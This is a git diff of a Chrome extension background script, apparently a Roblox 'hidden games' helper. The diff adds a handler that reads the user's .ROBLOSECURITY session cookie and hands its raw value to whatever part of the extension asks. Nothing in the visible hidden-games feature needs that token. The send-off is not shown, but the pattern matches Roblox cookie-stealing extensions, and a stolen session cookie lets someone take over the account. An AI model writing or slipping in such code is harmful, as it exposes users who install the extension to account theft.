@@ -1,3 +1,30 @@
+chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
+    if (request.action === "getRobloxCookie") {
+      getRobloxCookie()
+        .then(cookie => {
+          sendResponse({ success: true, cookie: cookie });
+        })
+        .catch(error => {
+          sendResponse({ success: false, message: error });
+        });
+      return true;  // Keep the message channel open for the async response
+    }
+  });
+  
+  // Function to get .ROBLOSECURITY cookie
+  function getRobloxCookie() {
+    return new Promise((resolve, reject) => {
+      chrome.cookies.get({ url: "https://www.roblox.com", name: ".ROBLOSECURITY" }, (cookie) => {
+        if (cookie) {
+          resolve(cookie.value);
+        } else {
+          reject("No .ROBLOSECURITY cookie found");
+        }
+      });
+    });
+  }
+  
+  
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     if (message.action === "fetchHiddenGames") {
         const userId = message.userId;
@@ -39,4 +66,3 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
             .catch(error => console.error('Error fetching hidden games:', error));
     }
 });
-//havent touched this since for ever AWOOOGAAAAAAAAAAAAAAAAAAAAA
